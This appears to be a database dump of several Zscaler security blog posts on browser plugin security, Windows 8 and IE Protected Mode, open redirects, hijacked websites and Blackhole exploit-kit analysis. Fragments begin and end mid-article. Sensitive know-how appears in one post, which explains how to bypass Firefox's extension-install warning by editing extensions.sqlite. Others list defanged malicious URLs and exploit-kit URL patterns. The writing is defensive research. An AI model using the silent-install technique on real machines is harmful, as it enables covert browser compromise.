The first extension I wanted to offer to Internet Explorer users is HTTPS Everywhere from the Electronic Frontier Foundation.Download HTTPS Everywhere for Internet ExplorerHTTPS EverywhereYou can get a detailed explanation of the original extension on the EFF website. In summary, the extension forces a browser to use HTTPS (encrypted HTTP) whenever possible (e.g. when the website allows it).HTTPS Everywhere redirects users to HTTPS URLs based on a set of rules. Switching from HTTP to HTTPS is still not as easy as it should be and many domains have not designed their websites to be accessed securely. I\'ve explained some of the challenges in an earlier post.The HTTPS Everywhere rules define which domain name can be accessed over HTTPS and how URLs need to be translated. For example, http://www.google.com/ should be translated into https://encrypted.google.com/. Some sections of websites may not be available over HTTPS and the rules take care of these exceptions.Example of HTTPS Everywhere rulesHTTPS Everywhere also secures cookies according to rules, adding the secure attribute to cookies sent by the server. This ensures that any later access to the domains using HTTP (unsecure) will not leak sensitive information such as the session ID.HTTPS Everywhere for Internet ExplorerI\'m very pleased to announce the release of HTTPS Everywhere for Internet Explorer 0.0.0.1.

Microsoft has a different approach with Windows 8 when it comes to protecting users against attack using the Flash plugin.  Embedded Flash Player  Windows 8 ships with its own version of Flash. Users can no longer install Flash from the Adobe website. On the good side, Flash updates are now part of the overall Windows update process.    This is similar to Apple shipping their own version of Java. While it forces users to update their plugins along with the OS, we\'ve also see the downside. MacOSX was hit by malware that used a vulnerability in the older Java version shipped by Apple that had been patched months prior by Oracle.    Microsoft and Adobe have a much closer relationship than Apple and Oracle, but the Flash version shipped by Windows 8 (11.3.376.12) is already quite far behind the latest version offered by Adobe (11.5.502.110). The same problem that Apple faced with keeping up with security upgrades might already be occurring in Windows 8.       	  		  			  		  		  			Flash version number in Windows 8 at the top  		  	         Internet Explorer Desktop and Internet Explorer Metro  Windows 8 comes with two version of Internet Explorer 10: the Desktop version and the Metro Version.       	  		  			  		  		  			Internet Explorer 10 Metro  		  	        The Desktop version is pretty much the same as Internet Explorer 9 on Windows 7. Besides the embedded Flash version, Flash content is handled the same way as it is in Internet Explorer 9.    The Metro version, besides a very different UI, handles Flash very differently. Microsoft has decided to let the Flash plugin run only on a list of whitelisted websites. For all other websites, Flash is disabled. This is a more intrusive protection than Click for Play, but it also brings better protection.       	  		  			  		  		  			Flash disabled on non-whitelisted website  		  	    However, I must say this behavior is quite disconcerting to the user. There is no warning from the browser that Flash has been disabled for a given website, but not for others. Most websites, like the one above, will just say that Flash is not installed, and give a link to the official Adobe website .... which the Windows 8 user cannot use!    The only work around for webmasters to enable Flash on their website is to ask users to switch to the Desktop version of Internet Explorer. Webmaster can add an HTML tag or HTTP header to request the user to switch versions. Internet Explorer Metro shows a popup suggesting a switch to the Desktop version.    No plugin    The other plugins (Java and others) work fine on the Desktop version, but not at all on the Metro version. No warning is shown to the user. Browser extensions (BHO, Browser Helper Object) are also not working with Internet Explorer Metro.    Microsoft is taking a radical approach by forbidding plugins and extensions to run in the Metro version of Internet Explorer. We will see if users switch back to the plugin-enabled Desktop version, or if webmasters will move to HTML5 to replace their Flash and Java content.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/flash-windows-8-good-bad-and-ugly');

I described the feature in a post last July. Click to Play disables all plugins by default on all pages. The user then has to explicitly click on a warning to let the plugin, Flash or Java for example, run. Chrome and Firefox both have Click to Play disabled by default. After trying to use Click to Play for a week in Firefox, I had to give up, too many websites were not working and the warning was not always showing on the page.Click to Play warning in Firefox 14Firefox 17Firefox 17 is the first browser to enable Click to Play by default, with a caveat. Click to Play is enabled only for plugins that are outdated and vulnerable. It is possible to enable Click to Play for all plugins, including up to date ones, by changing the property plugins.click_to_play to true in about:config. However, it is not possible to disable the feature for vulnerable plugins.One of the problems in the previous implementation of Click to Play was that plugins could be used without any visual widget on the page, so no warning would be displayed to the user. In Firefox 17, there is an additional icon on the left of the URL bar that is visible when a plugin has been disabled on the page. You can click on the blue icon to choose what to do: enable the plugin once, always enable the plugin on the site, etc.New icon to manage disabled pluginsMore options for always disable or enable outdated plugins on a sitePlugin checkFirefox has also had tools to verify whether the plugins installed are up to date for a while.

This opens a new tab to the Firefox website with information about the plugins installed.Information about my pluginsYou will notice that four of my plugins are unknown to Mozilla. In this case, the page cannot tell me whether they are up to date or not.Fortunately, Mozilla makes it clear when there\'s a difference between outdated versionssimply lacking new features and unsafe versions:Vulnerable Flash versionOutdated Flash versionClick to Play kicks in for vulnerable versions only, not for outdated versions of a plugin. This is better for companies that don\'t let users upgrade to the latest version (like Flash 11) but still install safe versions of older releases (Flash 9 in my example).Not full securityFirst, Mozilla cannot manage all plugins. It is not always able to tell whether a particular version is safe or not. Because Mozilla chooses to enable Click to Play for outdated and vulnerable version only, it would not have protected users against 0-day vulnerabilities, like the vulnerability that affected the latest version of the Java plugins, or the Flash 0-day exploit that circulated on the web.Strangely, the feature stopped working for me after a while. I reinstalled Firefox, wiping out all my user settings, a couple of times, but the same thing happened: after using Firefox for about one hour, Click to Play was not kicking in anymore.While it is not a silver bullet, this is a good step forward in making Firefox user safer. They have also made UI improvements since Firefox 14 that make the feature much more usable.', 'Analysis', 'https://www.zscaler.com/blogs/research/click-play-next-step-firefox');

This issue is the same as one we reported almost two years ago. Many .gov websites have open redirections that can be exploited by spammers. The example we detailed in February 2011 is actually still online, and so is the cross-site scripting (XSS) vulnerability that we found on the same page.How did we get there?Many websites want to warn users when they are leaving their domains. In the case of a .gov website, they want to make clear that an external domain does not carry the guarantee of being an official government website. This warning is supposed to add security for ens users. Facebook also uses a warning page because links can be added by anybody and Facebook cannot guarantee the safety of those URLs.Why are these warning being exploited?Spammers want clean URLs to bypass URL fitters and spam filters. They therefore use legitimate .gov websites to bypass security features. This warning may actually make the final URL look safer to the user by implying that the final URL has been linked and vetted, by the .gov website.In the case of www.fmcsa.dot.gov (see our previous post), the user has only 10 seconds to read the warning before being redirected automatically. That\'s great for the spammer as no additional click is required to redirect the user to the spam/scam site.These websites owners think they are adding additional security, but this decision is actually putting their users at risk. The assumption that leads to the abuse of open redirections is that the  user seeing the warning has clicked on an external link on a page from  the same .gov domain. Since the content on the .gov website is controlled, the external link has to be a safe link. The website creators did not think of spammers sending users directly to the warning page.The fixThe fix is actually easy - make sure the assumption is right. This means the warning page should make sure that the redirection is legitimate - that the URL is one that has been approved.There are a couple of way of ensuring that the redirection URL has been controlled:ReferrerOne way, not the most robust option, is to check the Referrer header to ensure the user comes from the same domain. This would stop user who clicked on a link in an e-mail, and spammers who use URL shorteners like bit.ly.WhitelistAnother option is to store all 3rd-party URLs in a whitelist, and check against the list before making any redirection. This would prevent anybody from using the redirection with arbitrary URLs. The main downside to this approach is the overhead to manage this list every time an external URL is added or removed from the website.HashThe most common solution is to sign the URL. For example, replace http://www.fmcsa.dot.gov/redirect.asp?page=http://www.zscaler.com/ with http://www.fmcsa.dot.gov/redirect.asp?page=http://www.zscaler.com/&;hash=THE_HASH where THE_HASH = hash(\"http://www.zscaler.com\" + secret). The URL is hashed with a secret key to prevent its replacement by a random address. This method is used by Facebook to guarantee the authenticity requests sent by Facebook to Facebook applications, for example.The important takeaway for all webmasters is to understand that spammers will take advantage of any flaw in web applications.

Vulnerable software    The attack surface of website is quite large, an attacker can target the CMS, its plugins, administration tools (PHPMyAdmin, Plesk, cPanel - tools which should not be publicly accessible), the web server, the FTP server, the DNS server, etc.    I looked at the number of CVEs issued in 2012 for the most popular software platforms in these areas:    	WordPress: 14 CVEs for the core, 42 for extensions, including security extensions that are supposed to make WordPress safer.  	Joomla: 7 in core  	Drupal: 20+ in core  	PHPMyAdmin: 5 - Gemenenet, a security company, was compromised through a vulnerability in PHPMyAdmin  	cPanel: 50,000 compromised through one attack  	Plesk: 1 CVE, but 50,000 websites compromised through it  	Apache: 30+ CVE (core and modules)  	BIND: 6 CVEs  	etc.    Some hosting companies were compromised as well: DreamHost (January 2012), ServerPro (February 2012), WHMCS (May 2012, provides billing and technical support to smaller hosting companies).    In your mail box    If you want some examples of hijacked websites redirecting users to malicious pages, you can take a look at your inbox. Just this morning, I received four similar messages about a fictitious payment sent to me through Intuit:    	  		  			  		  		  			Malicious e-mail  		  	    All the links and buttons point to the same URL on a hijacked site:      	www.eyslerimaging.com/blog/wp-content/plugins/flickr-widget/iprprocsd.html (photography blog)  	www.odiseya.net/wp-content/themes/twentyten/bewpinfr.html  	user3.inet.vn/wp-content/plugins/iprprocsd.html    These pages redirect to the same malicious page hxxp://navisiteseparation.net/detects/processing-details_requested.php.

ZAP makes it easy for anyone to determine the risk posed by a given mobile application. Users can do this by either looking up past results, or more importantly, proactively scan any iOS/Android app.    Why did we build ZAP? Being a inline security solution inspecting web traffic, it\'s imperative that we\'re able to not only analyze traditional web traffic, but also web traffic sent by mobile applications. While we think of mobile apps as native software, in many ways they behave like custom web browsers, leveraging HTTP(S) for communication. We therefore started building ZAP as an internal resource to analyze mobile app traffic, but quickly realized that people are all too trusting of mobile apps downloaded from an \'official\' app store. Leveraging ZAP, our research has shown that apps commonly expose privacy and security risks from sending passwords in clear text to sharing personally identifiable information (PII) with third parties and that\'s why we\'re also releasing a public version of ZAP - to empower people to see this for themselves.  Search  The easiest way to leverage ZAP is to search through the historical results. Simply by typing the name of a mobile application in the search field, you can see if it has previously been analyzed. To further refine your search, you can additionally include the OS name (iOS or Android).       	  		  			  		  		  			Sample ZAP Search Results  		  	    In the sample results above, you\'ll note that the application receives an overall score out of 100 with high numbers representing a greater security/privacy risk. Detail is also provided on the following four categories which influence the overall score:       	Authentication - Username/password information sent in clear text or using weak encoding methods  	Device Metadata Leakage - Transmission of device information such as the UDID (Unique Device Identifier), MAC address or details about the operating system  	PII Leakage - Sharing personally identifiable information such as phone numbers, email addresses, mailing addresses, etc.  	Exposed content - Communication with third parties such as advertisers and analytic firms      Scan  The true power of ZAP comes from it\'s ability to empower anyone to capture and analyze the web traffic from a mobile application. In order to accomplish this, we leveraged an excellent web proxy known as mitmproxy, built a front end to interface with it and created engines to automatically analyze the captured traffic to hilight security/privacy issues.    Scanning an application is as simple as pointing your phone to ZAP and using the application that you want to analyze - that\'s it. View the video below for a detailed walkthrough of the scanning functionality, but overall, it\'s a simple six step process as noted in the image below.         Video  The video below provides a detailed walkthrough of all ZAP functionality.            We look forward to hearing your feedback on how we can continue to improve ZAP, so please take it for a test drive and let us know what you think. There are many mobile apps that expose users to security/privacy risks and to date, the app store gatekeepers aren\'t doing an adequate job of protecting end users from these threats. Using ZAP you can help analyze the ever growing list of mobile apps and reveal those that are putting users at risk.

I showed, amongst other things, how a malicious browser extension can be added silently to any Firefox profile. I\'ve reworked the demonstration, and want to make it available to a wider audience.    3rd-party installation    You have probably already have encountered applications, like the Flash player or some repackaged free software, that wants you to install a toolbar or some spyware/adware for your browser. This is a 3rd-party installation of an extensions. For Firefox, this installation consists of copying the browser extension into your Firefox profile (or a special folder that contains extensions shared by all profiles).         	  		  			  		  		  			Software installer contains a toolbar/adware/spyware extension  		  	        Firefox protects against this type of external extension installation by prompting the user the next time the browser is started - the user has the option to disable (default action) or enable the new extension.                	  		  			  		  		  			Firefox warning for an extension installed outside of the browser  		  	        Silent installation    It is actually very easy to bypass the warning from Firefox. Firefox stores information about all extensions in a Sqlite3 database named extensions.sqlite, located in each Firefox profile. It contains:                     	name, version, description, etc.  	enabled or disabled  	active or not  	installed from official Mozilla extension site or not             	  		  			  		  		  			extensions.sqlite  		  	        When Firefox starts, it checks the list of extensions under /extensions/ against the content of extensions.sqlite. If an extension exists on disk, but is not listed in the database, a warning is shown. The trick to install an extension silently is to add a record into the database about the extension being installed and tell Firefox that the extension has actually already been approved by the user (active and enabled).    Demonstration    I\'ve written a small program that installs an extension silently into any Firefox profile. You can download the program and the extension here, and the source code there.    The program was written in C# and can be compiled with the free Visual Studio Express for .Net from Microsoft.                	  		  			  		  		  			Tool shows the steps to install the extension silently  		  	        The \"malicious\" extension does not actually do anything. All the malicious code has been commented out, although it includes some of the things an attacker could do, such as:                     	steal the list of logins and passwords saved  	send out all the URLs visited by the user  	disable security features      Do not worry about testing the \"malicious\" finctionality, the extension will not do anything - no information will be sent out.    I suggest that you create a custom profile to test the extension. To create a new profile named \"demo\", run the following command:    firefox -CreateProfile demo --no-remote    Then start Firefox with your new profile:    firefox -P demo --no-remote    I\'ve included a video that shows the silent installation in case you\'re fearful of trying it for yourself:                          Why it matters    Many free software packages push toolbars, adware and spyware into Firefox and other browsers, installed as part of their installation to earn some money for the extension creator (see previous PPI campaigns). Firefox gives users a chance to explicitly and clearly decide whether or not they want to enable these add-ons. Without this protection, many users can be tricked into running extensions they were are not aware of.    The second important point is that malicious browser extensions are much harder to detect once installed. Because extensions are part of the browser, their activity cannot be differentiated from the activity of the browser. Accessing the internet and accessing the file system are legitimate actions for the browser. The extension does not need to add itself to the startup scripts, or as a Windows service to be running after a computer reboot. The extension does not need to hook into Windows to intercept logins and passwords, etc. Finally, AV vendors struggle with detecting malicious JavaScript and any of the malicious Firefox extensions I\'ve checked with VirusTotal were never flagged.      Going further    The silent installation could be even more sneaky. Instead of adding a new extension, it could also replace an existing extension, or append itself to an existing extension.', 'Analysis', 'https://www.zscaler.com/blogs/research/how-install-silently-malicious-extensions-firefox');

With Windows 8, Microsoft added Enhanced Protected Mode. Protected Mode aims to keep users safe by restricting what BHOs (Browser Helper Objects, aka browser extensions) and plugins can do inside Internet Explorer.Protected Mode enabled by default in IE 9Protected ModeBefore I talk to the changes made in Windows 8, let me explain what Protected Mode does in Internet Explorer versions 7 through 9, especially when it comes to browser extensions. Internet Explorer, along with any extensions and plugins, run with a low integrity. This means that they have limited access to the system: read/write access to the file system, the registry and limited ability to run executables.Limitations Internet Explorer extensions have write access to /AppData/LocalLow and a few folders useed by Internet Explorer to store cookies and favorites. Any untrusted application can write to LocalLow without triggering any User Account Control (UAC) violations, including applications deployed with ClickOnce. Zscaler Safe Shopping for Internet Explorer for example, creates a sub-directory in LocalLow to store the list of fake stores.Extensions can run executables that have a low integrity only. Windows applications have a medium integrity, which means that Internet Explorer cannot run any application without an explicit permission from the user (UAC popup). An extension can therefore only launch an application with a low integrity, which means that it will have limited system access.Write  access to the registry is also limited. An extension can write to the registry only under HKEY_CURRENT_USER\\Software\\AppDataLow\\Software.Read accessProtected mode does however give read access to the entire file system. A malicious extension could therefore upload all your important files under My Documents to a malicious server, for example.Integrity elevationIt is possible to run an executable of a higher integrity by setting up an Integrity Elevation Policy. Basically, an entry is added to the registry to specify which executable should be run by a low integrity process at a higher integrity, without raising a UAC popup. This entry has to be added as an Administrator. It cannot be added from within Internet Explorer.Windows 8Windows 8 introduces Enhanced Protected Mode to fill some of the security gaps of the current Protected Mode. The most important change is a limit on read access. Read access to the file system and Registry are more restricted. Unfortunately, this new Protected Mode breaks many existing plugins. Microsoft has therefore decided to turn off Enhanced Protected Mode for Internet Explorer by default. So, by default, Windows 8 and Internet Explorer 10 do not offer any additional protection against data leakage by malicious browser extensions.The most important take away from this is that Protected Mode still lets lets all extensions read the entire file system and arbitrary applications can be launched silently.', 'Microsoft', 'https://www.zscaler.com/blogs/research/internet-explorer-protected-mode-windows-8');

ClickOnce is a a way to easily deploy applications on Windows computers. When a user clicks on a link that points to a ClikckOnce deployment, a new popup is opened. This popup is very different from any popup or window opened by Internet Explorer. If the user clicks on Install, the executable is downloaded and executed in a single step, without a way to cancel the installation at any point.If the user minimizes the browser, the popup remains visible on the screen.

An attacker can use a legitimate certificate with a name that sounds legitimate, or use a stolen code signing certificate (like Flamer).

This vulnerability affects all versions of Java 1.7 (aka Java 7). Oracle has not yet released a fix and if they stick to their quarterly patch cycle, one isn\'t likely to emerge until October.    Java has a long history of 0-day vulnerabilities being actively exploited. Exploits are usually drive-by attacks: users get infected by navigating to hijacked websites where an invisible Java applet drops a malicious executable on the user\'s machine. The very popular, Blackhole exploit kit includes numerous Java exploits.    In 2010, we reported a 300% increase of malicious JAR (Java archive) files. Recently, in March 2012, Java made the news due to the Flashback Trojan, a piece malware targeting an older Java version that shipped with Mac OS X. As can be seen, Java is constantly under attack.    Update: new Java version available    Oracle has released java 1.7.7 and 1.6.35 to fix the vulnerability.

Java 1.6.33 is NOT vulnerable to the latest 0-day exploit. However, I would not suggest that anybody downgrade from Java 1.7 to Java 1.6 as it is not yet known if version 1.6 is vulnerable to other flaws fixed in 1.7.

However, they can also represent big security holes. The Blackhole exploit kit, for example, has long contained code to exploit vulnerabilities in Flash, Java and Adobe Reader. While few people may actually need a Java plugin, Flash is still required on many websites and a PDF reader in the browser is quite convenient.Click to PlayBrowser vendors have been looking for ways to secure browser plugins. One way to achieve this involves sandboxing the plugins, i.e. running plugins in a more restricted environment than the browser, with fewer rights. Unfortunately, many exploits have demonstrated that it is all too often possible to break out of the sandbox.Another idea involves disabling plugins by default and enabling them only when they are actually required by the user. \"Click to Play\" means that users must take action to enable a plugin by clicking on the area of the page that is handled by a plugin, like a Flash animation.The vast majority of exploits, including Blackhole, use invisible elements to run the malicious code: an invisible applet, invisible Flash animation, etc. Since Click to Play requires the user to actually notice elements on he page that require a plugin in order to activate it, these exploits would not run.Click to Play in Firefox - 2 clicks are required to enable the 2 Flash animationsSome inconveniencesClick to Play seems like a great security improvement. Unfortunately, there are legitimate cases when a plugin might be required to run without having to display anything. For example, Flash is commonly used to copy text to the clipboard (a shortened URL, for example).There are also JavaScript frameworks that use invisible Flash or Java applets to get access to the webcam or microphone (this is not possible through JavaScript only).There also UX challenges when asking users to click YouTube videos over and over, for example, or to ensure that users understand why they may not want to enable all plugins by default, etc.Today, only two major web browsers support Click to Play - Chrome and Firefox, but this feature is disabled by default in both browsers.ChromeClick to Play was introduced as an option in Google Chrome in March 2011 with Chrome 10. Because it is disabled by default and Chrome rarely requires users to navigate through the settings to enable it, most users are likely not aware of this security feature.In the latest versions of Chrome, Click to Play is well hidden! To enable it one must go to the Wrench Icon - Settings - Show advanced settings - Content settings...then scroll down to Plug-ins and select \"Click to Play\". That\'s five clicks to access the option. This is definitely restricted to power users! If you do not know what \"Click to Play\" means, you are out of luck because there is no mouse-over or popup to show more information.Click to Play option in Chrome 20While the screenshot of Chrome 10 showed placeholders explaining that users had to click to enable the plugin, the current placeholder are quite obscure, with no information about what they are.Click to Play placeholders - What should I do?It looks like the Click to Play feature is pretty much dead in Chrome, restricted only to power users. Not much has happened since it was released over a year ago.Firefox 14Finally, a year after Chrome, Click to Play is making it first appearance in Firefox 14. Like Chrome, it is disabled by default, and restricted to power users. There is no UI option to enable the feature. You have to go to about:config, search for click_to_play, and change the option to true.Enable Click to Play in Firefox 14Firefox\'s placeholders are better than Chrome\'s, as they clearly state \"Click here to activate plugin\". I wish however that they would indicate which plugin is going to be activated (Flash versus Java, for example).Click to Play placeholders in FirefoxI\'m afraid that the current implementation does not play well with Flash embedded in an IFRAME. On  a website that embeds a YouTube video, I get a black box, with no option to enable Flash to see the video.To Mozilla\'s credit, this is just the first iteration of Click to Play. Full support for Click to Play is scheduled for Firefox 16. Looking at their website, they seem to have a good plan to tackle the UX issues.I hope Mozilla and Google are working on making Click to Play the default setting. This would result in a big improvement in securing users online. Right now, only a few users are aware of it and even fewer benefit from the added security.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/click-play-arrives-firefox');

There are between 300 and 500 of these sites blocked everyday, mostly legitimate websites that have been compromised.    I was interested in the geographical distribution of these sites. Here are the number of blocked (malicious and hijacked) sites per country (based on the website IP address), in absolute numbers. Note that to make the map useful, I decreased the number of blocked sites hosted in the US from 146 to 42 on the map because it was over 4 times that of the #2 (China).         	  		  			  		  		  			Country hosting popular websites blacklisted by Google Safe Browsing  		  	      As shown before, the US is hosting the biggest number of blacklisted sites (146), followed by China (45), followed by Germany (32) and Russia (26).    It is not surprising to see the US be #1 since they host more popular sites in general. Germany is also a popular hosting country, with lower prices than its neighbors. So I decided to show the map of blacklisted sites in relative numbers: number of blacklisted sites / number of sites hosted:         	  		  			  		  		  			Country hosting popular websites blacklisted by Google Safe Browsing in relative numbers  		  	      The distribution is pretty even amongst countries with a big Internet user population. The reason why a few small countries (Sri Lanka, Venezuela, Georgia, etc.) stand out is that they host very few sites (small sample size), so having just one or two sites blacklisted increase their percentage a lot.    Most of these blocked websites are legitimate sites hijacked as part of massive attacks spanning thousand of websites. Attackers constantly scan websites for known vulnerabilities, and they can be highly successful by finding vulnerabilities on popular websites. Blocked Chinese sites host malicious content that is very different from what I\'ve seen in other countries (see examples in the last paragraph of this post).

Some attackers go to great lengths to make their malicious code invisible to webmasters and security tools alike. In this post, I\'ll illustrate some of the places more commonly used to hide code and just how to spot them.SourceMost malicious JavaScript is pulled from a different domain other than the hijacked page. One of the first things I look for is the list of JavaScript files pulled from external domains. For example, hxxp://kelly-monaco.org/ contained a script pulled from inforaf.vot.pl that turned out to be malicious.Malicious external JavaScriptA page may contain many external JavaScript sources including, frameworks (jQuery, Prototype, etc.) a CDN, statistics (Google Analytics, counters, etc.), widgets, etc.LocationAnother good clue is the location of the script tag on the page. The attackers might be lazy and put the script tag at the very top or very bottom of the page. Always look at scripts palced before the opening HTML tag, or after the ending BODY tag.http://www.china-crb.cn/There are other places where a SCRIPT tag should not be found, for example, inside a TITLE tag.Coding StyleWhen I analyze a page, I also look for different coding styles. For example, if a webmaster uses double quotes around tag attributes, I would then look for a SCRIPT tag with single quotes, or no quotes at all. Similarly, the webmaster might use the type and language attributes. Any SCRIPT tag that uses a different coding style would raise a red flag.Well hiddenHere are some examples of very well hidden pieces of JavaScript that I\'ve encountered. In the first example, the website is using vBulletin, an open-source forum application. All vBulletin pages contain inline JavaScript to call vBulletin_init(). The attacker inserted his JavaScript between the original JavaScript command, and the function call:http://theexerciseblog.com/A malicious piece of code can also be inserted inside an existing legitimate JavaScript file on a hijacked site:Malicious code appended to AC_RunActiveContent.jsAn even more tricky spot to identify, but one more rarely used, is the insertion of malicious JavaScript inside a CSS style using expression():Malicious JavaScript in a style-sheetThese techniques are even combined with other tricks to deliver code which is directed only at specific users, such as IP blacklisting to block security scanners, cookies to prevent viewing the page twice, looking at the Referer tag to show the malicious code to users from specific sites, etc. The same page often has to be accessed in many different ways by security scanners to ensure that it is safe.', 'Analysis', 'https://www.zscaler.com/blogs/research/spotting-malicious-javascript-page');

First, most infected websites are not cleaned up after three days.

This type of scam is very, very common. It\'s amazing that is still works.In this example, the spammer uses a fake Youtube page to make the scam appear more legitimate.Survey scamI also found out that while Google Safe Browsing might block the infected site, it often does not block the actual malicious domain injected into the page in the form of a malicious IFRAME or JavaScript redirect.

The Blackhole exploit kit will deliver various malicious PDF files to a user if the victim is running a potentially vulnerable version of Adobe Reader. When these PDFs are opened through Adobe Reader, a known vulnerability is exploited which will then compromise the user’s machine.    Let’s look at the de-obfuscated portion of the Blackhole exploit kit. The exploit kit for this sample was delivered from “flightpub.net/l/src.php?case=46677c190b37f2d6”.    The de-obfuscated code above shows how an iFrame of 1x1 pixels is created to load a malicious PDF file residing at “./content/ap1.php?f=97d19::182b5” or “./content/ap1.php?f=97d19::182b5”, depending upon the version of Adobe reader installed. These two files are hosted on same the domain - “flightpub.net”.    The absolute paths of the malicious files are,    hxxp://flightpub.net/l/content/ap1.php?f=97d19::182b5 and  hxxp://flightpub.net/l/content/ap2.php?f=97d19::182b5    For analysis purposes, we can manually downloaded the aforementioned PDF files. The PDF files contain a JavaScript object, which contains obfuscated JavaScript, as shown below:             The JavaScript code loops through array ‘ar’ and converts each element of the array with logic included in function ‘test2()’. The de-obfuscated code targets a three year old vulnerability in Adobe Acrobat reader.    Let’s take a look at the some of the de-obfuscated code,            A stack based buffer overflow vulnerability exists in the ‘getIcon()’ method, which is detailed in CVE-2009-0927.    This vulnerability is widely targeted by various versions of the Blackhole exploit kit. I have seen different variants of the payload URL used to host these PDF exploits. The URL pattern changes with different variants of the exploit kit. The different URL path patterns seen so far are:    /content/ap1.php?f=97d19::182b5  /content/ap2.php?f=97d19::182b5  /content/fdp1.php?f=63  /content/fdp2.php?f=63  /content/adfp2.php?f=193  /content/adfp1.php?f=193    The common pattern in the above URL paths are ‘/content/’ and ‘.php?f=’.

There were reports of Twitter being used for C&C updates as part of an early March variant. However, it is unclear if this communication avenue was ever actually used by the botherder.\r\n	The latest variants of the Trojan, namely variant I and variant K, both exploit Java vulnerabilities- CVE-2011-3544 (Flashbak.I) and CVE-2012-0507 (Flashback.K). Oracle patched this latest vulnerability back in mid-February. Their CVSS risk matrix for this vulnerability can be seen below:\r\n	 \r\n	\r\n	Apple initially released a patch for the vulnerability April 3rd, six weeks after Oracle and then quietly announced on April 5th an update to the patch due to a few issues: \r\n	Then there is the question of what the Trojan does/is doing. It has the capability to modify web pages (web-injects) viewed in Safari, based on a configuration file received from the C&C.  However, it is not clear exactly what the web-injects will be used for. Similar functionality exists in many other bots, such as Zeus and is typically used to include additional form fields on banking sites to gather additional information such as SSN, debit card number, pin, etc.\r\n	Finally, there is the question of how widespread the infections are.  Dr. Web has reported 550K infections.  Which would certainly rank this among the largest botnets. Some have claimed the numbers to be over-hyped or mis-counted.  However, Kaspersky recently published a blog confirming the and even upping the number to 600K+ after sink-holing a C&C.\r\n\r\n\r\nFrom the perspective of Zscaler\'s Enterprise customers - we are indeed seeing Flashback infections, many of which include older variants of the Trojan.

Developing for Internet Explorer was a very different experience than developing for the other browsers I\'ve worked with before - Firefox, Firefox Mobile, Google Chrome, Safari and Opera.\r\n\r\nOverall Architecture\r\n\r\nInternet Explorer extensions are called Browser Helper Objects (BHO). They are libraries (DLL) implementing a specific interface. They must be registered as a BHO through a registry key in order to be used by Internet Explorer.\r\n\r\nThe BHO is loaded per tab or window, meaning there is no built-in communication between tabs/windows. BHOs can interact with the browser and the document through native code or injected JavaScript.\r\n\r\nBHOs can be written in C++, C# or VB.Net. Since I\'m most familiar with C#, this is the language I\'ve used. Unfortunately, there are many limitations with .Net based BHOs:\r\n\r\n	The BHO name, displayed in the Internet Explorer \"Manage Add-on\" page, displays the namespace of the application. I could not therefore display \"Zscaler Safe Shopping\", so I had to cheat and use Zscaler as the namespace, and SafeShopping as the main class name to display \"Zscaler.SafeShopping\". (see DUcer\'s comment below)\r\n	Many important functions are not implemented in C# and unmanaged C++ code has to be imported.\r\n	Internet Explorer is very picky about performance - if an add-on takes more then 0.20 seconds to load, IE suggests to users that they disable the plugin (see more details below). Due to the fact that .Net add-ons require IE to load the .Net framework, it is pretty much impossible to stay below this limit.\r\n\r\nBecause the extensions are comprised of compiled code, I could not download extensions to check out their source code as examples, unlike extensions for other browsers, which are written in JavaScript. In addition, Microsoft has only high-level documentation about BHOs and very few code examples (with most leveraging C++).\r\n\r\nProtected mode\r\n\r\nStarting with Windows Vista and Internet Explorer 7, Internet Explorer works in Protected Mode by default. This means BHOs are limited in the places they can read/write to disk and read/write to the registry. You need to call special functions to know where you are allowed to write to the disk, but these functions are available in C++ only. I had to use a mix of hardcoded values and unmanaged C++ DLL import to add all necessary functionality.\r\n\r\nBecause there are no built-in debugging functions to understand what is going on inside the extension, and limited documentation from Microsoft, it took me quite a while to understand how to deal with Protected Mode.\r\n\r\nInconsistent environments\r\n\r\nOn other platforms, extensions are relatively compatible between browser versions and operating systems. With Firefox extensions, for example, it doesn\'t matter if the browser is running on Linux, Windows 95 or Mac OS X. These browsers are also very good at maintaining forward compatibility: extensions working on one version usually work fine on newer versions of the same browser. Internet Explorer is a different beast.\r\n\r\nSome of the API belongs to the Windows OS, while other portions belong to Internet Explorer. For example, Protected Mode exists on IE 7 on Windows Vista, but not on Windows XP. The API to manage disk access is also different on the two OSs. Calling Windows Vista\'s API will crash Internet Explorer on Windows XP, for example. Add-ons are definitely not forward compatible.\r\n\r\nSome API calls also get \"randomly\" broken. For example, the event BeforeNavigate2 is broken on Windows 7. This was reported during for Release Candidates, but never fixed and the event is not triggered anymore.\r\n\r\nNo love for extensions\r\n\r\nMicrosoft does not seem to have much love for browser extensions. In fact, I think they actually hate them!\r\n\r\nThere is no good website to download IE extensions. The official Microsoft website, Internet Explorer Gallery, contains very few extensions. Add-ons are not even shown on the front page, instead they promote pinned sites (introduced with IE 9)\r\n\r\nDevelopers don\'t get much love either. In addition to the problems and limitations listed above, the add-on infrastructure in Internet Explorer is very weak. Developers have to write their own installer to install and register their BHOs. They also have to write the uninstaller, as IE lets users disabled BHOs, but not uninstall them.

There was a two day difference from March 2011 to 2012 for the tournament dates - these are noticeable in the tracked stats.  The data shows only a slight increase (<1%) in March Madness traffic this year compared to last year - in general this appears to be a fairly static and expected event within Enterprise traffic.   With the Super Bowl in early February and the NCAA basketball tournament (\"March Madness\") sports are a major focus of attention in Quarter 1.  That means a lot of bandwidth consumed by the enterprise and time spent by employees on this subject.  One report calculated that an estimated $1.7B is to be lost in productivity at the office during this March Madness.  Even if sports are not your thing, you may find yourself participating in an office pool surrounding the Super Bowl or March Madness.  When I was filling out my bracket this year, I found myself on some \"gambling\" web-sites to do some quick research on team odds in the tournament (not that it helped my bracket any).  I was curious how much bandwidth we saw across our enterprise customers related to sports and gambling for these major Q1 sporting events and to also see if there was any correlation.  For those interested in tracking this subject, here are my findings from our large, diverse, enterprise customers:The above blue line represents gambling traffic as a percentage of its total seen thus far for the quarter, and the red line is sports traffic as a percentage of its total seen thus far for the quarter.  The cyclic nature of our data-set is because this is from our enterprise customers -many of which have less employees working on weekends.  (Date periods are related to PST time)There were not large noticeable spikes in sports or gambling traffic observed in the enterprise during the NFL playoffs or Super Bowl - likely due to the fact that the NFL games are on the weekend and toward the end of the season may have a more regional versus global fan base. However, there was a very noticeable increase in traffic surrounding March Madness - particularly during the 2nd round of games, several of which are televised during US work hours.  Specifically the start of March Madness had about a 74% increase in sports related traffic from the Super Bowl.  Throughout our Q1 data-set we see that gambling closely follows the traffic patterns related to sports.  In the case of the noticeable spike in sports traffic, we see a similar related pattern increases in gambling traffic.  One major exception related to gambling was the period of Feb 20 -22.  While most of the baseline gambling traffic 